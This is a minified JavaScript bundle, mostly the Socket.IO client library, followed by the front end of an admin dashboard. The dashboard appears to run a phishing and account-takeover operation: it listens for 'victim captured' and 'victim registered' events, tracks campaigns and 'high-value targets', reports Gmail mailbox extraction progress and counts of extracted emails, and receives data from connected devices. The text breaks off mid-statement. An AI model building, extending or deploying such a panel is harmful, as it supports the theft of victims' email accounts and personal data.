this.transports.shift(),this._open();this.emitReserved("error",t),this._onClose("transport error",t)}_onClose(t,s){if(this.readyState==="opening"||this.readyState==="open"||this.readyState==="closing"){if(this.clearTimeoutFn(this._pingTimeoutTimer),this.transport.removeAllListeners("close"),this.transport.close(),this.transport.removeAllListeners(),Qt&&(this._beforeunloadEventListener&&removeEventListener("beforeunload",this._beforeunloadEventListener,!1),this._offlineEventListener)){const a=yt.indexOf(this._offlineEventListener);a!==-1&&yt.splice(a,1)}this.readyState="closed",this.id=null,this.emitReserved("close",t,s),this.writeBuffer=[],this._prevBufferLen=0}}}ze.protocol=Cn;class Gr extends ze{constructor(){super(...arguments),this._upgrades=[]}onOpen(){if(super.onOpen(),this.readyState==="open"&&this.opts.upgrade)for(let t=0;t<this._upgrades.length;t++)this._probe(this._upgrades[t])}_probe(t){let s=this.createTransport(t),a=!1;ze.priorWebsocketSuccess=!1;const r=()=>{a||(s.send([{type:"ping",data:"probe"}]),s.once("packet",b=>{if(!a)if(b.type==="pong"&&b.data==="probe"){if(this.upgrading=!0,this.emitReserved("upgrading",s),!s)return;ze.priorWebsocketSuccess=s.name==="websocket",this.transport.pause(()=>{a||this.readyState!=="closed"&&(f(),this.setTransport(s),s.send([{type:"upgrade"}]),this.emitReserved("upgrade",s),s=null,this.upgrading=!1,this.flush())})}else{const o=new Error("probe error");o.transport=s.name,this.emitReserved("upgradeError",o)}}))};function i(){a||(a=!0,f(),s.close(),s=null)}const c=b=>{const o=new Error("probe error: "+b);o.transport=s.name,i(),this.emitReserved("upgradeError",o)};function x(){c("transport closed")}function l(){c("socket closed")}function y(b){s&&b.name!==s.name&&i()}const f=()=>{s.removeListener("open",r),s.removeListener("error",c),s.removeListener("close",x),this.off("close",l),this.off("upgrading",y)};s.once("open",r),s.once("error",c),s.once("close",x),this.once("close",l),this.once("upgrading",y),this._upgrades.indexOf("webtransport")!==-1&&t!=="webtransport"?this.setTimeoutFn(()=>{a||s.open()},200):s.open()}onHandshake(t){this._upgrades=this._filterUpgrades(t.upgrades),super.onHandshake(t)}_filterUpgrades(t){const s=[];for(let a=0;a<t.length;a++)~this.transports.indexOf(t[a])&&s.push(t[a]);return s}}let Qr=class extends Gr{constructor(t,s={}){const a=typeof t=="object"?t:s;(!a.transports||a.transports&&typeof a.transports[0]=="string")&&(a.transports=(a.transports||["polling","websocket","webtransport"]).map(r=>zr[r]).filter(r=>!!r)),super(t,a)}};function Wr(n,t="",s){let a=n;s=s||typeof location<"u"&&location,n==null&&(n=s.protocol+"//"+s.host),typeof n=="string"&&(n.charAt(0)==="/"&&(n.charAt(1)==="/"?n=s.protocol+n:n=s.host+n),/^(https?|wss?):\/\//.test(n)||(typeof s<"u"?n=s.protocol+"//"+n:n="https://"+n),a=Gt(n)),a.port||(/^(http|ws)$/.test(a.protocol)?a.port="80":/^(http|ws)s$/.test(a.protocol)&&(a.port="443")),a.path=a.path||"/";const i=a.host.indexOf(":")!==-1?"["+a.host+"]":a.host;return a.id=a.protocol+"://"+i+":"+a.port+t,a.href=a.protocol+"://"+i+(s&&s.port===a.port?"":":"+a.port),a}const Jr=typeof ArrayBuffer=="function",Xr=n=>typeof ArrayBuffer.isView=="function"?ArrayBuffer.isView(n):n.buffer instanceof ArrayBuffer,Ln=Object.prototype.toString,Yr=typeof Blob=="function"||typeof Blob<"u"&&Ln.call(Blob)==="[object BlobConstructor]",Zr=typeof File=="function"||typeof File<"u"&&Ln.call(File)==="[object FileConstructor]";function hs(n){return Jr&&(n instanceof ArrayBuffer||Xr(n))||Yr&&n instanceof Blob||Zr&&n instanceof File}function vt(n,t){if(!n||typeof n!="object")return!1;if(Array.isArray(n)){for(let s=0,a=n.length;s<a;s++)if(vt(n[s]))return!0;return!1}if(hs(n))return!0;if(n.toJSON&&typeof n.toJSON=="function"&&arguments.length===1)return vt(n.toJSON(),!0);for(const s in n)if(Object.prototype.hasOwnProperty.call(n,s)&&vt(n[s]))return!0;return!1}function ei(n){const t=[],s=n.data,a=n;return a.data=Wt(s,t),a.attachments=t.length,{packet:a,buffers:t}}function Wt(n,t){if(!n)return n;if(hs(n)){const s={_placeholder:!0,num:t.length};return t.push(n),s}else if(Array.isArray(n)){const s=new Array(n.length);for(let a=0;a<n.length;a++)s[a]=Wt(n[a],t);return s}else if(typeof n=="object"&&!(n instanceof Date)){const s={};for(const a in n)Object.prototype.hasOwnProperty.call(n,a)&&(s[a]=Wt(n[a],t));return s}return n}function ti(n,t){return n.data=Jt(n.data,t),delete n.attachments,n}function Jt(n,t){if(!n)return n;if(n&&n._placeholder===!0){if(typeof n.num=="number"&&n.num>=0&&n.num<t.length)return t[n.num];throw new Error("illegal attachments")}else if(Array.isArray(n))for(let s=0;s<n.length;s++)n[s]=Jt(n[s],t);else if(typeof n=="object")for(const s in n)Object.prototype.hasOwnProperty.call(n,s)&&(n[s]=Jt(n[s],t));return n}const si=["connect","connect_error","disconnect","disconnecting","newListener","removeListener"],ni=5;var ee;(function(n){n[n.CONNECT=0]="CONNECT",n[n.DISCONNECT=1]="DISCONNECT",n[n.EVENT=2]="EVENT",n[n.ACK=3]="ACK",n[n.CONNECT_ERROR=4]="CONNECT_ERROR",n[n.BINARY_EVENT=5]="BINARY_EVENT",n[n.BINARY_ACK=6]="BINARY_ACK"})(ee||(ee={}));class ai{constructor(t){this.replacer=t}encode(t){return(t.type===ee.EVENT||t.type===ee.ACK)&&vt(t)?this.encodeAsBinary({type:t.type===ee.EVENT?ee.BINARY_EVENT:ee.BINARY_ACK,nsp:t.nsp,data:t.data,id:t.id}):[this.encodeAsString(t)]}encodeAsString(t){let s=""+t.type;return(t.type===ee.BINARY_EVENT||t.type===ee.BINARY_ACK)&&(s+=t.attachments+"-"),t.nsp&&t.nsp!=="/"&&(s+=t.nsp+","),t.id!=null&&(s+=t.id),t.data!=null&&(s+=JSON.stringify(t.data,this.replacer)),s}encodeAsBinary(t){const s=ei(t),a=this.encodeAsString(s.packet),r=s.buffers;return r.unshift(a),r}}function Ps(n){return Object.prototype.toString.call(n)==="[object Object]"}class ms extends de{constructor(t){super(),this.reviver=t}add(t){let s;if(typeof t=="string"){if(this.reconstructor)throw new Error("got plaintext data when reconstructing a packet");s=this.decodeString(t);const a=s.type===ee.BINARY_EVENT;a||s.type===ee.BINARY_ACK?(s.type=a?ee.EVENT:ee.ACK,this.reconstructor=new ri(s),s.attachments===0&&super.emitReserved("decoded",s)):super.emitReserved("decoded",s)}else if(hs(t)||t.base64)if(this.reconstructor)s=this.reconstructor.takeBinaryData(t),s&&(this.reconstructor=null,super.emitReserved("decoded",s));else throw new Error("got binary data when not reconstructing a packet");else throw new Error("Unknown type: "+t)}decodeString(t){let s=0;const a={type:Number(t.charAt(0))};if(ee[a.type]===void 0)throw new Error("unknown packet type "+a.type);if(a.type===ee.BINARY_EVENT||a.type===ee.BINARY_ACK){const i=s+1;for(;t.charAt(++s)!=="-"&&s!=t.length;);const c=t.substring(i,s);if(c!=Number(c)||t.charAt(s)!=="-")throw new Error("Illegal attachments");a.attachments=Number(c)}if(t.charAt(s+1)==="/"){const i=s+1;for(;++s&&!(t.charAt(s)===","||s===t.length););a.nsp=t.substring(i,s)}else a.nsp="/";const r=t.charAt(s+1);if(r!==""&&Number(r)==r){const i=s+1;for(;++s;){const c=t.charAt(s);if(c==null||Number(c)!=c){--s;break}if(s===t.length)break}a.id=Number(t.substring(i,s+1))}if(t.charAt(++s)){const i=this.tryParse(t.substr(s));if(ms.isPayloadValid(a.type,i))a.data=i;else throw new Error("invalid payload")}return a}tryParse(t){try{return JSON.parse(t,this.reviver)}catch{return!1}}static isPayloadValid(t,s){switch(t){case ee.CONNECT:return Ps(s);case ee.DISCONNECT:return s===void 0;case ee.CONNECT_ERROR:return typeof s=="string"||Ps(s);case ee.EVENT:case ee.BINARY_EVENT:return Array.isArray(s)&&(typeof s[0]=="number"||typeof s[0]=="string"&&si.indexOf(s[0])===-1);case ee.ACK:case ee.BINARY_ACK:return Array.isArray(s)}}destroy(){this.reconstructor&&(this.reconstructor.finishedReconstruction(),this.reconstructor=null)}}class ri{constructor(t){this.packet=t,this.buffers=[],this.reconPack=t}takeBinaryData(t){if(this.buffers.push(t),this.buffers.length===this.reconPack.attachments){const s=ti(this.reconPack,this.buffers);return this.finishedReconstruction(),s}return null}finishedReconstruction(){this.reconPack=null,this.buffers=[]}}const ii=Object.freeze(Object.defineProperty({__proto__:null,Decoder:ms,Encoder:ai,get PacketType(){return ee},protocol:ni},Symbol.toStringTag,{value:"Module"}));function ke(n,t,s){return n.on(t,s),function(){n.off(t,s)}}const ci=Object.freeze({connect:1,connect_error:1,disconnect:1,disconnecting:1,newListener:1,removeListener:1});class Mn extends de{constructor(t,s,a){super(),this.connected=!1,this.recovered=!1,this.receiveBuffer=[],this.sendBuffer=[],this._queue=[],this._queueSeq=0,this.ids=0,this.acks={},this.flags={},this.io=t,this.nsp=s,a&&a.auth&&(this.auth=a.auth),this._opts=Object.assign({},a),this.io._autoConnect&&this.open()}get disconnected(){return!this.connected}subEvents(){if(this.subs)return;const t=this.io;this.subs=[ke(t,"open",this.onopen.bind(this)),ke(t,"packet",this.onpacket.bind(this)),ke(t,"error",this.onerror.bind(this)),ke(t,"close",this.onclose.bind(this))]}get active(){return!!this.subs}connect(){return this.connected?this:(this.subEvents(),this.io._reconnecting||this.io.open(),this.io._readyState==="open"&&this.onopen(),this)}open(){return this.connect()}send(...t){return t.unshift("message"),this.emit.apply(this,t),this}emit(t,...s){var a,r,i;if(ci.hasOwnProperty(t))throw new Error('"'+t.toString()+'" is a reserved event name');if(s.unshift(t),this._opts.retries&&!this.flags.fromQueue&&!this.flags.volatile)return this._addToQueue(s),this;const c={type:ee.EVENT,data:s};if(c.options={},c.options.compress=this.flags.compress!==!1,typeof s[s.length-1]=="function"){const f=this.ids++,b=s.pop();this._registerAckCallback(f,b),c.id=f}const x=(r=(a=this.io.engine)===null||a===void 0?void 0:a.transport)===null||r===void 0?void 0:r.writable,l=this.connected&&!(!((i=this.io.engine)===null||i===void 0)&&i._hasPingExpired());return this.flags.volatile&&!x||(l?(this.notifyOutgoingListeners(c),this.packet(c)):this.sendBuffer.push(c)),this.flags={},this}_registerAckCallback(t,s){var a;const r=(a=this.flags.timeout)!==null&&a!==void 0?a:this._opts.ackTimeout;if(r===void 0){this.acks[t]=s;return}const i=this.io.setTimeoutFn(()=>{delete this.acks[t];for(let x=0;x<this.sendBuffer.length;x++)this.sendBuffer[x].id===t&&this.sendBuffer.splice(x,1);s.call(this,new Error("operation has timed out"))},r),c=(...x)=>{this.io.clearTimeoutFn(i),s.apply(this,x)};c.withError=!0,this.acks[t]=c}emitWithAck(t,...s){return new Promise((a,r)=>{const i=(c,x)=>c?r(c):a(x);i.withError=!0,s.push(i),this.emit(t,...s)})}_addToQueue(t){let s;typeof t[t.length-1]=="function"&&(s=t.pop());const a={id:this._queueSeq++,tryCount:0,pending:!1,args:t,flags:Object.assign({fromQueue:!0},this.flags)};t.push((r,...i)=>a!==this._queue[0]?void 0:(r!==null?a.tryCount>this._opts.retries&&(this._queue.shift(),s&&s(r)):(this._queue.shift(),s&&s(null,...i)),a.pending=!1,this._drainQueue())),this._queue.push(a),this._drainQueue()}_drainQueue(t=!1){if(!this.connected||this._queue.length===0)return;const s=this._queue[0];s.pending&&!t||(s.pending=!0,s.tryCount++,this.flags=s.flags,this.emit.apply(this,s.args))}packet(t){t.nsp=this.nsp,this.io._packet(t)}onopen(){typeof this.auth=="function"?this.auth(t=>{this._sendConnectPacket(t)}):this._sendConnectPacket(this.auth)}_sendConnectPacket(t){this.packet({type:ee.CONNECT,data:this._pid?Object.assign({pid:this._pid,offset:this._lastOffset},t):t})}onerror(t){this.connected||this.emitReserved("connect_error",t)}onclose(t,s){this.connected=!1,delete this.id,this.emitReserved("disconnect",t,s),this._clearAcks()}_clearAcks(){Object.keys(this.acks).forEach(t=>{if(!this.sendBuffer.some(a=>String(a.id)===t)){const a=this.acks[t];delete this.acks[t],a.withError&&a.call(this,new Error("socket has been disconnected"))}})}onpacket(t){if(t.nsp===this.nsp)switch(t.type){case ee.CONNECT:t.data&&t.data.sid?this.onconnect(t.data.sid,t.data.pid):this.emitReserved("connect_error",new Error("It seems you are trying to reach a Socket.IO server in v2.x with a v3.x client, but they are not compatible (more information here: https://socket.io/docs/v3/migrating-from-2-x-to-3-0/)"));break;case ee.EVENT:case ee.BINARY_EVENT:this.onevent(t);break;case ee.ACK:case ee.BINARY_ACK:this.onack(t);break;case ee.DISCONNECT:this.ondisconnect();break;case ee.CONNECT_ERROR:this.destroy();const a=new Error(t.data.message);a.data=t.data.data,this.emitReserved("connect_error",a);break}}onevent(t){const s=t.data||[];t.id!=null&&s.push(this.ack(t.id)),this.connected?this.emitEvent(s):this.receiveBuffer.push(Object.freeze(s))}emitEvent(t){if(this._anyListeners&&this._anyListeners.length){const s=this._anyListeners.slice();for(const a of s)a.apply(this,t)}super.emit.apply(this,t),this._pid&&t.length&&typeof t[t.length-1]=="string"&&(this._lastOffset=t[t.length-1])}ack(t){const s=this;let a=!1;return function(...r){a||(a=!0,s.packet({type:ee.ACK,id:t,data:r}))}}onack(t){const s=this.acks[t.id];typeof s=="function"&&(delete this.acks[t.id],s.withError&&t.data.unshift(null),s.apply(this,t.data))}onconnect(t,s){this.id=t,this.recovered=s&&this._pid===s,this._pid=s,this.connected=!0,this.emitBuffered(),this.emitReserved("connect"),this._drainQueue(!0)}emitBuffered(){this.receiveBuffer.forEach(t=>this.emitEvent(t)),this.receiveBuffer=[],this.sendBuffer.forEach(t=>{this.notifyOutgoingListeners(t),this.packet(t)}),this.sendBuffer=[]}ondisconnect(){this.destroy(),this.onclose("io server disconnect")}destroy(){this.subs&&(this.subs.forEach(t=>t()),this.subs=void 0),this.io._destroy(this)}disconnect(){return this.connected&&this.packet({type:ee.DISCONNECT}),this.destroy(),this.connected&&this.onclose("io client disconnect"),this}close(){return this.disconnect()}compress(t){return this.flags.compress=t,this}get volatile(){return this.flags.volatile=!0,this}timeout(t){return this.flags.timeout=t,this}onAny(t){return this._anyListeners=this._anyListeners||[],this._anyListeners.push(t),this}prependAny(t){return this._anyListeners=this._anyListeners||[],this._anyListeners.unshift(t),this}offAny(t){if(!this._anyListeners)return this;if(t){const s=this._anyListeners;for(let a=0;a<s.length;a++)if(t===s[a])return s.splice(a,1),this}else this._anyListeners=[];return this}listenersAny(){return this._anyListeners||[]}onAnyOutgoing(t){return this._anyOutgoingListeners=this._anyOutgoingListeners||[],this._anyOutgoingListeners.push(t),this}prependAnyOutgoing(t){return this._anyOutgoingListeners=this._anyOutgoingListeners||[],this._anyOutgoingListeners.unshift(t),this}offAnyOutgoing(t){if(!this._anyOutgoingListeners)return this;if(t){const s=this._anyOutgoingListeners;for(let a=0;a<s.length;a++)if(t===s[a])return s.splice(a,1),this}else this._anyOutgoingListeners=[];return this}listenersAnyOutgoing(){return this._anyOutgoingListeners||[]}notifyOutgoingListeners(t){if(this._anyOutgoingListeners&&this._anyOutgoingListeners.length){const s=this._anyOutgoingListeners.slice();for(const a of s)a.apply(this,t.data)}}}function Ze(n){n=n||{},this.ms=n.min||100,this.max=n.max||1e4,this.factor=n.factor||2,this.jitter=n.jitter>0&&n.jitter<=1?n.jitter:0,this.attempts=0}Ze.prototype.duration=function(){var n=this.ms*Math.pow(this.factor,this.attempts++);if(this.jitter){var t=Math.random(),s=Math.floor(t*this.jitter*n);n=Math.floor(t*10)&1?n+s:n-s}return Math.min(n,this.max)|0};Ze.prototype.reset=function(){this.attempts=0};Ze.prototype.setMin=function(n){this.ms=n};Ze.prototype.setMax=function(n){this.max=n};Ze.prototype.setJitter=function(n){this.jitter=n};class Xt extends de{constructor(t,s){var a;super(),this.nsps={},this.subs=[],t&&typeof t=="object"&&(s=t,t=void 0),s=s||{},s.path=s.path||"/socket.io",this.opts=s,At(this,s),this.reconnection(s.reconnection!==!1),this.reconnectionAttempts(s.reconnectionAttempts||1/0),this.reconnectionDelay(s.reconnectionDelay||1e3),this.reconnectionDelayMax(s.reconnectionDelayMax||5e3),this.randomizationFactor((a=s.randomizationFactor)!==null&&a!==void 0?a:.5),this.backoff=new Ze({min:this.reconnectionDelay(),max:this.reconnectionDelayMax(),jitter:this.randomizationFactor()}),this.timeout(s.timeout==null?2e4:s.timeout),this._readyState="closed",this.uri=t;const r=s.parser||ii;this.encoder=new r.Encoder,this.decoder=new r.Decoder,this._autoConnect=s.autoConnect!==!1,this._autoConnect&&this.open()}reconnection(t){return arguments.length?(this._reconnection=!!t,t||(this.skipReconnect=!0),this):this._reconnection}reconnectionAttempts(t){return t===void 0?this._reconnectionAttempts:(this._reconnectionAttempts=t,this)}reconnectionDelay(t){var s;return t===void 0?this._reconnectionDelay:(this._reconnectionDelay=t,(s=this.backoff)===null||s===void 0||s.setMin(t),this)}randomizationFactor(t){var s;return t===void 0?this._randomizationFactor:(this._randomizationFactor=t,(s=this.backoff)===null||s===void 0||s.setJitter(t),this)}reconnectionDelayMax(t){var s;return t===void 0?this._reconnectionDelayMax:(this._reconnectionDelayMax=t,(s=this.backoff)===null||s===void 0||s.setMax(t),this)}timeout(t){return arguments.length?(this._timeout=t,this):this._timeout}maybeReconnectOnOpen(){!this._reconnecting&&this._reconnection&&this.backoff.attempts===0&&this.reconnect()}open(t){if(~this._readyState.indexOf("open"))return this;this.engine=new Qr(this.uri,this.opts);const s=this.engine,a=this;this._readyState="opening",this.skipReconnect=!1;const r=ke(s,"open",function(){a.onopen(),t&&t()}),i=x=>{this.cleanup(),this._readyState="closed",this.emitReserved("error",x),t?t(x):this.maybeReconnectOnOpen()},c=ke(s,"error",i);if(this._timeout!==!1){const x=this._timeout,l=this.setTimeoutFn(()=>{r(),i(new Error("timeout")),s.close()},x);this.opts.autoUnref&&l.unref(),this.subs.push(()=>{this.clearTimeoutFn(l)})}return this.subs.push(r),this.subs.push(c),this}connect(t){return this.open(t)}onopen(){this.cleanup(),this._readyState="open",this.emitReserved("open");const t=this.engine;this.subs.push(ke(t,"ping",this.onping.bind(this)),ke(t,"data",this.ondata.bind(this)),ke(t,"error",this.onerror.bind(this)),ke(t,"close",this.onclose.bind(this)),ke(this.decoder,"decoded",this.ondecoded.bind(this)))}onping(){this.emitReserved("ping")}ondata(t){try{this.decoder.add(t)}catch(s){this.onclose("parse error",s)}}ondecoded(t){Tt(()=>{this.emitReserved("packet",t)},this.setTimeoutFn)}onerror(t){this.emitReserved("error",t)}socket(t,s){let a=this.nsps[t];return a?this._autoConnect&&!a.active&&a.connect():(a=new Mn(this,t,s),this.nsps[t]=a),a}_destroy(t){const s=Object.keys(this.nsps);for(const a of s)if(this.nsps[a].active)return;this._close()}_packet(t){const s=this.encoder.encode(t);for(let a=0;a<s.length;a++)this.engine.write(s[a],t.options)}cleanup(){this.subs.forEach(t=>t()),this.subs.length=0,this.decoder.destroy()}_close(){this.skipReconnect=!0,this._reconnecting=!1,this.onclose("forced close")}disconnect(){return this._close()}onclose(t,s){var a;this.cleanup(),(a=this.engine)===null||a===void 0||a.close(),this.backoff.reset(),this._readyState="closed",this.emitReserved("close",t,s),this._reconnection&&!this.skipReconnect&&this.reconnect()}reconnect(){if(this._reconnecting||this.skipReconnect)return this;const t=this;if(this.backoff.attempts>=this._reconnectionAttempts)this.backoff.reset(),this.emitReserved("reconnect_failed"),this._reconnecting=!1;else{const s=this.backoff.duration();this._reconnecting=!0;const a=this.setTimeoutFn(()=>{t.skipReconnect||(this.emitReserved("reconnect_attempt",t.backoff.attempts),!t.skipReconnect&&t.open(r=>{r?(t._reconnecting=!1,t.reconnect(),this.emitReserved("reconnect_error",r)):t.onreconnect()}))},s);this.opts.autoUnref&&a.unref(),this.subs.push(()=>{this.clearTimeoutFn(a)})}}onreconnect(){const t=this.backoff.attempts;this._reconnecting=!1,this.backoff.reset(),this.emitReserved("reconnect",t)}}const nt={};function ct(n,t){typeof n=="object"&&(t=n,n=void 0),t=t||{};const s=Wr(n,t.path||"/socket.io"),a=s.source,r=s.id,i=s.path,c=nt[r]&&i in nt[r].nsps,x=t.forceNew||t["force new connection"]||t.multiplex===!1||c;let l;return x?l=new Xt(a,t):(nt[r]||(nt[r]=new Xt(a,t)),l=nt[r]),s.query&&!t.query&&(t.query=s.queryKey),l.socket(s.path,t)}Object.assign(ct,{Manager:Xt,Socket:Mn,io:ct,connect:ct});const li=window.location.origin;class oi{constructor(){Ie(this,"socket",null);Ie(this,"reconnectAttempts",0);Ie(this,"maxReconnectAttempts",10);Ie(this,"reconnectDelay",1e3);Ie(this,"reconnectOptions",{});Ie(this,"subscriptions",new Map);Ie(this,"connectionListeners",new Set)}connect(t="/admin",s){var a;return(a=this.socket)!=null&&a.connected?this.socket:(s&&(this.reconnectOptions=s,this.maxReconnectAttempts=s.maxAttempts||this.maxReconnectAttempts,this.reconnectDelay=s.delay||this.reconnectDelay),this.socket=ct(`${li}${t}`,{transports:["websocket","polling"],reconnection:!0,reconnectionAttempts:this.maxReconnectAttempts,reconnectionDelay:this.reconnectDelay,reconnectionDelayMax:5e3,timeout:2e4,forceNew:!1}),this.socket.on("connect",()=>{var r,i;console.log("Socket.IO connected to",t),this.reconnectAttempts=0,this.notifyConnectionListeners(!0),(i=(r=this.reconnectOptions).onReconnect)==null||i.call(r),this.subscriptions.forEach((c,x)=>{var l;(l=this.socket)==null||l.emit("subscribe:updates",{type:x})})}),this.socket.on("disconnect",r=>{var i;console.log("Socket.IO disconnected:",r),this.notifyConnectionListeners(!1),r==="io server disconnect"&&((i=this.socket)==null||i.connect())}),this.socket.on("connect_error",r=>{var i,c;console.error("Socket.IO connection error:",r),this.reconnectAttempts++,this.reconnectAttempts>=this.maxReconnectAttempts&&(console.error("Max reconnection attempts reached"),(c=(i=this.reconnectOptions).onReconnectFailed)==null||c.call(i))}),this.socket.on("reconnect",r=>{var i,c;console.log("Socket.IO reconnected after",r,"attempts"),this.reconnectAttempts=0,this.notifyConnectionListeners(!0),(c=(i=this.reconnectOptions).onReconnect)==null||c.call(i)}),this.socket.on("reconnect_attempt",r=>{console.log("Socket.IO reconnection attempt",r)}),this.socket.on("reconnect_error",r=>{console.error("Socket.IO reconnection error:",r)}),this.socket.on("reconnect_failed",()=>{var r,i;console.error("Socket.IO reconnection failed"),(i=(r=this.reconnectOptions).onReconnectFailed)==null||i.call(r)}),this.socket)}disconnect(){this.socket&&(this.socket.disconnect(),this.socket=null)}subscribe(t,s){var r,i,c,x,l,y,f,b,o,p,g,h,m,B,P,S,O,V;this.socket||this.connect(),this.subscriptions.has(t)||this.subscriptions.set(t,new Set),(r=this.subscriptions.get(t))==null||r.add(s),(i=this.socket)==null||i.emit("subscribe:updates",{type:t});const a=v=>{(v.type===t||v.type==="all"||t==="all")&&s({...v,timestamp:v.timestamp||new Date().toISOString()})};(c=this.socket)==null||c.on("update",a),(t==="victims"||t==="all")&&((x=this.socket)==null||x.on("victim:captured",v=>s({type:"victim:captured",data:v,timestamp:new Date().toISOString()})),(l=this.socket)==null||l.on("victim:registered",v=>s({type:"victim:registered",data:v,timestamp:new Date().toISOString()})),(y=this.socket)==null||y.on("victim:validation-complete",v=>s({type:"victim:validation-complete",data:v,timestamp:new Date().toISOString()}))),(t==="campaigns"||t==="all")&&((f=this.socket)==null||f.on("campaign:created",v=>s({type:"campaign:created",data:v,timestamp:new Date().toISOString()})),(b=this.socket)==null||b.on("campaign:updated",v=>s({type:"campaign:updated",data:v,timestamp:new Date().toISOString()})),(o=this.socket)==null||o.on("campaign:status-changed",v=>s({type:"campaign:status-changed",data:v,timestamp:new Date().toISOString()}))),(t==="gmail"||t==="all")&&((p=this.socket)==null||p.on("gmail:access-initiated",v=>s({type:"gmail:access-initiated",data:v,timestamp:new Date().toISOString()})),(g=this.socket)==null||g.on("gmail:extraction-completed",v=>s({type:"gmail:extraction-completed",data:v,timestamp:new Date().toISOString()})),(h=this.socket)==null||h.on("gmail:extraction-progress",v=>s({type:"gmail:extraction-progress",data:v,timestamp:new Date().toISOString()}))),(t==="devices"||t==="all")&&((m=this.socket)==null||m.on("device:connected",v=>s({type:"device:connected",data:v,timestamp:new Date().toISOString()})),(B=this.socket)==null||B.on("device:disconnected",v=>s({type:"device:disconnected",data:v,timestamp:new Date().toISOString()})),(P=this.socket)==null||P.on("device:status-changed",v=>s({type:"device:status-changed",data:v,timestamp:new Date().toISOString()})),(S=this.socket)==null||S.on("device:data-received",v=>s({type:"device:data-received",data:v,timestamp:new Date().toISOString()}))),(t==="activity"||t==="all")&&((O=this.socket)==null||O.on("activity:new",v=>s({type:"activity:new",data:v,timestamp:new Date().toISOString()})),(V=this.socket)==null||V.on("activity:log-created",v=>s({type:"activity:log-created",data:v,timestamp:new Date().toISOString()})))}unsubscribe(t,s){var a,r,i,c,x,l,y,f,b,o,p,g,h,m,B,P,S,O;t?s?(a=this.subscriptions.get(t))==null||a.delete(s):(this.subscriptions.delete(t),(r=this.socket)==null||r.off("update")):(this.subscriptions.clear(),(i=this.socket)==null||i.off("update"),(c=this.socket)==null||c.off("victim:captured"),(x=this.socket)==null||x.off("victim:registered"),(l=this.socket)==null||l.off("victim:validation-complete"),(y=this.socket)==null||y.off("campaign:created"),(f=this.socket)==null||f.off("campaign:updated"),(b=this.socket)==null||b.off("campaign:status-changed"),(o=this.socket)==null||o.off("gmail:access-initiated"),(p=this.socket)==null||p.off("gmail:extraction-completed"),(g=this.socket)==null||g.off("gmail:extraction-progress"),(h=this.socket)==null||h.off("device:connected"),(m=this.socket)==null||m.off("device:disconnected"),(B=this.socket)==null||B.off("device:status-changed"),(P=this.socket)==null||P.off("device:data-received"),(S=this.socket)==null||S.off("activity:new"),(O=this.socket)==null||O.off("activity:log-created"))}onConnectionChange(t){return this.connectionListeners.add(t),()=>{this.connectionListeners.delete(t)}}notifyConnectionListeners(t){this.connectionListeners.forEach(s=>s(t))}getSocket(){return this.socket}}const at=new oi;function Ge(n={}){const{type:t,enabled:s=!0,onMessage:a,onError:r,onConnect:i,onDisconnect:c}=n,[x,l]=d.useState(null),[y,f]=d.useState(!1),b=d.useRef(a);d.useEffect(()=>{b.current=a},[a]),d.useEffect(()=>{if(!s)return;const p=at.connect("/admin",{onReconnect:()=>{f(!0),i==null||i()},onReconnectFailed:()=>{f(!1),r==null||r(new Error("Failed to reconnect to server"))}});f(p.connected);const g=at.onConnectionChange(h=>{f(h),h?i==null||i():c==null||c()});if(t){const h=m=>{l(m.data),b.current&&b.current(m)};return at.subscribe(t,h),()=>{g(),at.unsubscribe(t,h)}}return()=>{g()}},[t,s,r,i,c]);const o=d.useCallback((p,g)=>{const h=at.getSocket();h==null||h.emit(p,g)},[]);return{data:x,isConnected:y,emit:o}}function di(n={}){const{enabled:t=!0,onDeviceConnected:s,onDeviceDisconnected:a,onDeviceStatusChanged:r,onDeviceDataReceived:i,onError:c}=n,x=d.useCallback(l=>{switch(l.type){case"device:connected":s==null||s(l.data);break;case"device:disconnected":a==null||a(l.data);break;case"device:status-changed":r==null||r(l.data);break;case"device:data-received":i==null||i(l.data);break}},[s,a,r,i]);return Ge({type:"devices",enabled:t,onMessage:x,onError:c})}function hi(n={}){const{enabled:t=!0,onActivityLogCreated:s,onActivityNew:a,onError:r}=n,i=d.useCallback(c=>{switch(c.type){case"activity:log-created":s==null||s(c.data);break;case"activity:new":a==null||a(c.data);break}},[s,a]);return Ge({type:"activity",enabled:t,onMessage:i,onError:r})}function mi(){var O,V,v,I;const{toast:n}=Se(),[t,s]=d.useState(null),[a,r]=d.useState([]),[i,c]=d.useState(null),[x,l]=d.useState(!0),[y,f]=d.useState(null),[b,o]=d.useState(!1),[p,g]=d.useState([]),{isConnected:h}=Ge({type:"all",enabled:!0,onMessage:u=>{var D,z,G;if(u.type==="victim:captured"||u.type==="victim:registered")m(),n({title:"New Victim",description:u.data.email||"New victim captured"});else if(u.type==="victim:validation-complete")m(),n({title:"Victim Validated",description:`Validation completed for ${u.data.victimId}`});else if(u.type==="campaign:created"||u.type==="campaign:updated"||u.type==="campaign:status-changed")m(),n({title:"Campaign Updated",description:((D=u.data.campaign)==null?void 0:D.name)||"Campaign status changed"});else if(u.type==="gmail:extraction-completed"||u.type==="gmail:extraction-progress")t&&s({...t,total_gmail_access:(t.total_gmail_access||0)+1}),u.type==="gmail:extraction-completed"&&n({title:"Gmail Extraction Complete",description:`Extracted ${((z=u.data.itemsExtracted)==null?void 0:z.emails)||0} emails`});else if(u.type==="alert:high-value-target"){const j={id:u.data.victimId,type:"new_high_value",victim_id:u.data.victimId,victim_email:u.data.email,message:`New high-value target: ${u.data.email}`,timestamp:u.data.timestamp||new Date().toISOString()};g(W=>[j,...W].slice(0,10)),n({title:"High-Value Target",description:`New high-value target captured: ${u.data.email}`,variant:"default"})}else if(u.type==="dashboard:stats-update")u.data&&s(j=>j&&{...j,...u.data});else if(u.type==="system:health-update")t&&u.data&&s({...t,system_health:{...t.system_health,...u.data}});else if(u.type==="activity:new"){const j={id:Date.now(),action:u.data.actionType||"Unknown",details:u.data.actionDetails||"",user_id:((G=u.data.actor)==null?void 0:G.id)||0,created_at:u.data.timestamp||new Date().toISOString()};r(W=>[j,...W].slice(0,20))}},onError:u=>{console.error("WebSocket error:",u)}}),m=async()=>{try{const u=await Q.apiRequest("/admin/dashboard"),D=await Q.apiRequest("/admin/dashboard/victim-analytics"),z=await Q.apiRequest("/admin/dashboard/system-health").catch(()=>({database:"warning",timestamp:new 